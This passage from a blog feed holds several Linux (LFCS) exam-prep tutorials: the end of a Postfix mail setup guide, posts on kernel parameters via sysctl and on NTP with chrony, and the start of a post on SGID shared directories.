<p>The alias will get the mails destined for the user. I&rsquo;ve added an alias on my system so that root&rsquo;s mail will be delivered to nixhat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root: nixhat</span></code></pre></td></tr></table></div></figure>


<p>After changing any alias settings, you have to refresh the alias DB with the command <code>postalias /etc/aliases</code></p>

<p>Now it&rsquo;s time to edit some parameters in order to setup a working mail configuration.</p>

<ul>
<li>The <strong>myorigin</strong> parameter specifies the domain that locally-posted mail appears to come from</li>
</ul>


<p>The default is to use the hostname for this, but I will change it to use just the domain (example.com in this case)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf -e 'myorigin=$mydomain'
</span><span class='line'>[root@centos ~]# postconf myorigin
</span><span class='line'>myorigin = $mydomain</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The <strong>inet_interfaces</strong> parameter specifies the network interface addresses that this mail system receives mail on</li>
</ul>


<p>Here I have mine listening on the Ethernet interface in addition to localhost:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf inet_interfaces
</span><span class='line'>inet_interfaces = 192.168.217.131, localhost</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The <strong>relayhost</strong> parameter specifies the default host to send mail to when no entry is matched in the optional transport(5) table. When no relayhost is given, mail is routed directly to the destination. On an intranet, specify the organizational domain name. In the case of SMTP, specify a domain, host, host:port, [host]:port, [address] or [address]:port; the form [host] turns off MX lookups.</li>
</ul>


<p>If you want to forward mail to a central host, use the <strong>relayhost</strong> parameter</p>

<ul>
<li>The <strong>mydestination</strong> parameter specifies the list of domains that this machine considers itself the final destination for. This parameter is important for receiving messages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf mydestination
</span><span class='line'>mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The <strong>mynetworks</strong> parameter specifies the list of &ldquo;trusted&rdquo; SMTP clients that are allowed to relay mail through Postfix. It can allow clients on the local subnet, in a range, just a host, or manually specified.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf mynetworks
</span><span class='line'>mynetworks = 192.168.217.0/24 127.0.0.0/8 [::1]/128</span></code></pre></td></tr></table></div></figure>


<h2>Restricting access to the server</h2>

<p>For receiving mail, you can add some settings to harden the security of your server:</p>

<ul>
<li><strong>smtpd_helo_required</strong> &ndash; Require that a remote SMTP client sends HELO or EHLO before commencing a MAIL transaction</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_helo_required
</span><span class='line'>smtpd_helo_required = yes</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>smtpd_helo_restrictions</strong> &ndash; other optional restrictions:</li>
</ul>


<p><strong>permit_mynetworks</strong> &ndash; Permit the request when the client IP address matches any network or network address listed in $mynetworks</p>

<p> <strong>reject_invalid_helo_hostname</strong> &ndash; Reject the request when the HELO or EHLO hostname is malformed</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_helo_restrictions
</span><span class='line'>smtpd_helo_restrictions = permit_mynetworks, reject_invalid_helo_hostname</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>smtpd_sender_restrictions</strong> &ndash; Optional restrictions that the Postfix SMTP server applies in the context of a client MAIL FROM command:</li>
</ul>


<p><strong>reject_unknown_sender_domain</strong> &ndash; Reject the request when Postfix is not final destination for the sender address, and the MAIL FROM domain has 1) no DNS MX and no DNS A record, or 2) a malformed MX record such as a record with a zero-length MX hostname</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_sender_restrictions
</span><span class='line'>smtpd_sender_restrictions = permit_mynetworks, reject_unknown_sender_domain</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>smtpd_recipient_restrictions</strong> &ndash; Optional restrictions that the Postfix SMTP server applies in the context of a client RCPT TO command</li>
</ul>


<p><strong>reject_unauth_destination</strong> &ndash; reject the request unless 1) Postfix is the mail forwarder; or 2) Postfix is the final destination</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_recipient_restrictions
</span><span class='line'>smtpd_recipient_restrictions = permit_mynetworks, reject_unauth_destination</span></code></pre></td></tr></table></div></figure>


<p>After changing Postfix settings, it is a good idea to run <code>postfix check</code> to check the validity of the config file. Then restart Postfix.</p>

<p>Now to test it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "This is a test" | mail -s "test" root@example.com</span></code></pre></td></tr></table></div></figure>


<p>On user nixhat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mail
</span><span class='line'>Heirloom Mail version 12.5 7/5/10.  Type ? for help.
</span><span class='line'>"/var/spool/mail/nixhat": 1 message 1 new
</span><span class='line'>&gt;N  1 root                  Sat Feb 17 18:08  18/569   "test"
</span><span class='line'>cat  /var/spool/mail/nixhat
</span><span class='line'>From root@example.com  Sat Feb 17 18:08:09 2018
</span><span class='line'>Return-Path: &lt;root@example.com&gt;
</span><span class='line'>X-Original-To: root@example.com
</span><span class='line'>Delivered-To: root@example.com
</span><span class='line'>Received: by centos.example.com (Postfix, from userid 0)
</span><span class='line'>  id 51255218FED7; Sat, 17 Feb 2018 18:08:09 +0200 (EET)
</span><span class='line'>Date: Sat, 17 Feb 2018 18:08:09 +0200
</span><span class='line'>To: root@example.com
</span><span class='line'>Subject: test
</span><span class='line'>User-Agent: Heirloom mailx 12.5 7/5/10
</span><span class='line'>MIME-Version: 1.0
</span><span class='line'>Content-Type: text/plain; charset=us-ascii
</span><span class='line'>Content-Transfer-Encoding: 7bit
</span><span class='line'>Message-Id: &lt;20180217160809.51255218FED7@centos.example.com&gt;
</span><span class='line'>From: root@example.com (root)
</span><span class='line'>Status: O
</span><span class='line'>
</span><span class='line'>This is a test</span></code></pre></td></tr></table></div></figure>


<p>So it works. If you want to see more about the status of your mails, look inside <code>/var/log/maillog</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Feb 17 18:21:11 centos postfix/pickup[8896]: 4FADF218FED8: uid=0 from=&lt;root&gt;
</span><span class='line'>Feb 17 18:21:11 centos postfix/cleanup[9359]: 4FADF218FED8: message-id=&lt;20180217162111.4FADF218FED8@centos.example.com&gt;
</span><span class='line'>Feb 17 18:21:11 centos postfix/qmgr[8897]: 4FADF218FED8: from=&lt;root@example.com&gt;, size=431, nrcpt=1 (queue active)
</span><span class='line'>Feb 17 18:21:11 centos postfix/local[9361]: 4FADF218FED8: to=&lt;nixhat@example.com&gt;, orig_to=&lt;root@example.com&gt;, relay=local, delay=0.08, delays=0.07/0.02/0/0, dsn=2.0.0, status=sent (delivered to mailbox)
</span><span class='line'>Feb 17 18:21:11 centos postfix/qmgr[8897]: 4FADF218FED8: removed</span></code></pre></td></tr></table></div></figure>


<p>Some other useful actions with mail would be to view the mail queue with <strong>mailq</strong> and flush the queue with <strong>postfix flush</strong></p>

<p>Also see <strong>man 5 postconf</strong> for all Postfix parameters</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: What lies on the bottom of the ocean \
</span><span class='line'>\ and twitches? A: A nervous wreck.       /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Changing kernel parameters]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/15/lfcs-prep-changing-kernel-parameters/"/>
    <updated>2018-02-15T13:28:47-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/15/lfcs-prep-changing-kernel-parameters</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll look at changing kernel parameters both at runtime and at boot. Such changes can be made with the <strong>sysctl</strong> command or by inputting values in different files inside <code>/proc/sys</code></p>

<!-- more -->


<p>Let&rsquo;s see a sample /proc/sys folder, which can differ between systems:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /proc/sys
</span><span class='line'>abi  crypto  debug  dev  fs  kernel  net  sunrpc  vm</span></code></pre></td></tr></table></div></figure>


<p>The most important entries are:</p>

<ul>
<li><p>dev contains parameters for system devices</p></li>
<li><p>fs contains filesystem parameters</p></li>
<li><p>kernel is used for kernel parameters</p></li>
<li><p>net contains network parameters</p></li>
<li><p>vm contains virtual memory parameters</p></li>
</ul>


<p>To modify runtime parameters, we can use <strong>sysctl</strong>. Let&rsquo;s take a look at all the available parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysctl -a | wc -l
</span><span class='line'>951</span></code></pre></td></tr></table></div></figure>


<p>Too many to list here, so let&rsquo;s glance over a few random ipv4 parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysctl -a | grep net.ipv4 | tail
</span><span class='line'>net.ipv4.tcp_tso_win_divisor = 3
</span><span class='line'>net.ipv4.tcp_tw_recycle = 0
</span><span class='line'>net.ipv4.tcp_tw_reuse = 0
</span><span class='line'>net.ipv4.tcp_window_scaling = 1
</span><span class='line'>net.ipv4.tcp_wmem = 4096    16384    4194304
</span><span class='line'>net.ipv4.tcp_workaround_signed_windows = 0
</span><span class='line'>net.ipv4.udp_mem = 43428    57905    86856
</span><span class='line'>net.ipv4.udp_rmem_min = 4096
</span><span class='line'>net.ipv4.udp_wmem_min = 4096
</span><span class='line'>net.ipv4.xfrm4_gc_thresh = 32768</span></code></pre></td></tr></table></div></figure>


<p>The dots in the options represent actual slashes in the directory structure under /proc/sys. Now let&rsquo;s take a value and modify it. I will use the packet forwarding feature for this example</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/sys/net/ipv4/ip_forward
</span><span class='line'>1</span></code></pre></td></tr></table></div></figure>


<p>So the system is configured to forward packets as a router. To change this, we can put a 0 value in the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</span></code></pre></td></tr></table></div></figure>


<p>Another option is to write a value with sysctl. Here I enable IP forwarding again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysctl -w net.ipv4.ip_forward=1
</span><span class='line'>net.ipv4.ip_forward = 1</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Changes made in this way won&rsquo;t persist a reboot. To make them permanent, you have to edit the configuration file.
This used to be <code>/etc/sysctl.conf</code> , and can still be used, but newer systems look for config files inside <strong>/etc/sysctl.d/</strong>, <strong>/run/sysctl.d/</strong>, and <strong>/usr/lib/sysctl.d/</strong> (in order of precedence). On such systems, you can modify the <code>/usr/lib/sysctl.d/00-system</code> file for your kernel settings.</p>

<p>I edited mine to disable IP forwarding:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Disable IP forwarding
</span><span class='line'>net.ipv4.ip_forward = 0</span></code></pre></td></tr></table></div></figure>


<p>If you don&rsquo;t want to reboot, you can have sysctl re-read its config files by doing <strong>sysctl -p</strong> with the config file of your choice (by default, it will read <strong>/etc/sysctl.conf</strong>)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sysctl -p /usr/lib/sysctl.d/00-system.conf 
</span><span class='line'>net.ipv4.ip_forward = 0
</span><span class='line'>cat /proc/sys/net/ipv4/ip_forward
</span><span class='line'>0</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
</span><span class='line'>/ You're definitely on their list. The \
</span><span class='line'>| question to ask next is what list it |
</span><span class='line'>\ is.                                  /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - NTP configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/14/lfcs-prep-ntp-configuration/"/>
    <updated>2018-02-14T14:50:41-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/14/lfcs-prep-ntp-configuration</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll look at NTP configuration by using chrony, which is installed by default on newer RedHat systems.</p>

<!-- more -->


<p>Ensure that the <strong>chronyd</strong> service is started and let&rsquo;s take a look at the current time setttings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl
</span><span class='line'>      Local time: Thu 2018-02-15 02:15:51 JST
</span><span class='line'>  Universal time: Wed 2018-02-14 17:15:51 UTC
</span><span class='line'>        RTC time: Wed 2018-02-14 17:15:52
</span><span class='line'>       Time zone: Asia/Tokyo (JST, +0900)
</span><span class='line'>     NTP enabled: no
</span><span class='line'>NTP synchronized: no
</span><span class='line'> RTC in local TZ: no
</span><span class='line'>      DST active: n/a</span></code></pre></td></tr></table></div></figure>


<p>Now look inside chrony&rsquo;s config file, which is <code>/etc/chrony.conf</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Use public servers from the pool.ntp.org project.
</span><span class='line'># Please consider joining the pool (http://www.pool.ntp.org/join.html).
</span><span class='line'>server 0.rhel.pool.ntp.org iburst
</span><span class='line'>server 1.rhel.pool.ntp.org iburst
</span><span class='line'>server 2.rhel.pool.ntp.org iburst
</span><span class='line'>server 3.rhel.pool.ntp.org iburst
</span><span class='line'>
</span><span class='line'># Ignore stratum in source selection.
</span><span class='line'>stratumweight 0
</span><span class='line'>
</span><span class='line'># Record the rate at which the system clock gains/losses time.
</span><span class='line'>driftfile /var/lib/chrony/drift
</span><span class='line'>
</span><span class='line'># Enable kernel RTC synchronization.
</span><span class='line'>rtcsync
</span><span class='line'>
</span><span class='line'># In first three updates step the system clock instead of slew
</span><span class='line'># if the adjustment is larger than 10 seconds.
</span><span class='line'>makestep 10 3
</span><span class='line'>
</span><span class='line'># Allow NTP client access from local network.
</span><span class='line'>#allow 192.168/16
</span><span class='line'>
</span><span class='line'># Listen for commands only on localhost.
</span><span class='line'>bindcmdaddress 127.0.0.1
</span><span class='line'>bindcmdaddress ::1
</span><span class='line'>
</span><span class='line'># Serve time even if not synchronized to any NTP server.
</span><span class='line'>#local stratum 10
</span><span class='line'>
</span><span class='line'>keyfile /etc/chrony.keys
</span><span class='line'>
</span><span class='line'># Specify the key used as password for chronyc.
</span><span class='line'>commandkey 1
</span><span class='line'>
</span><span class='line'># Generate command key if missing.
</span><span class='line'>generatecommandkey
</span><span class='line'>
</span><span class='line'># Disable logging of client accesses.
</span><span class='line'>noclientlog
</span><span class='line'>
</span><span class='line'># Send a message to syslog if a clock adjustment is larger than 0.5 seconds.
</span><span class='line'>logchange 0.5
</span><span class='line'>
</span><span class='line'>logdir /var/log/chrony
</span><span class='line'>#log measurements statistics tracking</span></code></pre></td></tr></table></div></figure>


<p>There is a set of default servers configured, but you can add your own. You can also allow NTP client access in the local network by uncommenting or adding the <strong>allow</strong> directive with a range.</p>

<p>In the previous timedatectl output we saw that NTP and synchronization weren&rsquo;t enabled, so let&rsquo;s enable them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl set-ntp 1
</span><span class='line'>timedatectl | grep -i ntp
</span><span class='line'>     NTP enabled: yes
</span><span class='line'>NTP synchronized: no</span></code></pre></td></tr></table></div></figure>


<p>We still have to manage the NTP synchronization. In the config file we have some server pools enabled, but we want to know exact names for the servers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chronyc sources -v
</span><span class='line'>210 Number of sources = 4
</span><span class='line'>
</span><span class='line'>  .-- Source mode  '^' = server, '=' = peer, '#' = local clock.
</span><span class='line'> / .- Source state '*' = current synced, '+' = combined , '-' = not combined,
</span><span class='line'>| /   '?' = unreachable, 'x' = time may be in error, '~' = time too variable.
</span><span class='line'>||                                                 .- xxxx [ yyyy ] +/- zzzz
</span><span class='line'>||      Reachability register (octal) -.           |  xxxx = adjusted offset,
</span><span class='line'>||      Log2(Polling interval) --.      |          |  yyyy = measured offset,
</span><span class='line'>||                                \     |          |  zzzz = estimated error.
</span><span class='line'>||                                 |    |           \
</span><span class='line'>MS Name/IP address         Stratum Poll Reach LastRx Last sample
</span><span class='line'>===============================================================================
</span><span class='line'>^? ts1.sct.de                    0   8     0   10y     +0ns[   +0ns] +/-    0ns
</span><span class='line'>^? greenstone-quarry.the-jad     0   8     0   10y     +0ns[   +0ns] +/-    0ns
</span><span class='line'>^? 1b.ncomputers.org             0   8     0   10y     +0ns[   +0ns] +/-    0ns
</span><span class='line'>^? shout.ovh                     0   8     0   10y     +0ns[   +0ns] +/-    0ns</span></code></pre></td></tr></table></div></figure>


<p>Now we can pick a server to synchronize with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ntpdate -vd ts1.sct.de
</span><span class='line'>15 Feb 02:37:52 ntpdate[9511]: ntpdate 4.2.6p5@1.2349-o Wed Mar  1 09:00:52 UTC 2017 (1)
</span><span class='line'>Looking for host ts1.sct.de and service ntp
</span><span class='line'>host found : ts1.sct.de
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>server 193.141.27.1, port 123
</span><span class='line'>stratum 2, precision -24, leap 00, trust 000
</span><span class='line'>refid [193.141.27.1], delay 0.07736, dispersion 0.00209
</span><span class='line'>transmitted 4, in filter 4
</span><span class='line'>reference time:    de2ec48b.aba7efb5  Wed, Feb 14 2018 23:22:03.670
</span><span class='line'>originate timestamp: de2ec847.3cbf5eb1  Wed, Feb 14 2018 23:37:59.237
</span><span class='line'>transmit timestamp:  de2ef276.d94d8084  Thu, Feb 15 2018  2:37:58.848
</span><span class='line'>filter delay:  0.07916  0.07736  0.08383  0.07954 
</span><span class='line'>         0.00000  0.00000  0.00000  0.00000 
</span><span class='line'>filter offset: -10799.6 -10799.6 -10799.6 -10799.6
</span><span class='line'>         0.000000 0.000000 0.000000 0.000000
</span><span class='line'>delay 0.07736, dispersion 0.00209
</span><span class='line'>offset -10799.642908
</span><span class='line'>
</span><span class='line'>15 Feb 02:37:58 ntpdate[9511]: step time server 193.141.27.1 offset -10799.642908 sec</span></code></pre></td></tr></table></div></figure>


<p>To get more information about the NTP status, check the tracking:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chronyc tracking
</span><span class='line'>Reference ID    : 193.141.27.1 (ts1.sct.de)
</span><span class='line'>Stratum         : 3
</span><span class='line'>Ref time (UTC)  : Wed Feb 14 14:41:11 2018
</span><span class='line'>System time     : 0.000000000 seconds fast of NTP time
</span><span class='line'>Last offset     : +10799.637695312 seconds
</span><span class='line'>RMS offset      : 10799.637695312 seconds
</span><span class='line'>Frequency       : 0.000 ppm fast
</span><span class='line'>Residual freq   : -1.456 ppm
</span><span class='line'>Skew            : 1000000.000 ppm
</span><span class='line'>Root delay      : 0.069487 seconds
</span><span class='line'>Root dispersion : 1528.844971 seconds
</span><span class='line'>Update interval : 0.0 seconds
</span><span class='line'>Leap status     : Normal</span></code></pre></td></tr></table></div></figure>


<p>You can see the server in the Reference ID and the Leap status that confirms the synchronization. Also re-check with timedatectl that NTP is working:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl | grep -i ntp
</span><span class='line'>     NTP enabled: yes
</span><span class='line'>NTP synchronized: yes</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Give thought to your reputation.       \
</span><span class='line'>| Consider changing name and moving to a |
</span><span class='line'>\ new town.                              /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configuring SGID directories]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/13/lfcs-prep-configuring-sgid-directories/"/>
    <updated>2018-02-13T12:39:42-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/13/lfcs-prep-configuring-sgid-directories</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll see how to configure SGID directories to share files between members of the same group.</p>

<!-- more -->


<p>I created a group called saiyans with a GID of 9000 to separate it from the rest of the groups:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>groupadd -g 9000 saiyans</span></code></pre></td></tr></table></div></figure>


<p>I made a directory that will be used to share files within the group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /opt/invasion_plans</span></code></pre></td></tr></table></div></figure>


<p>Changed the ownership of the directory to the nobody user and the saiyans group.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
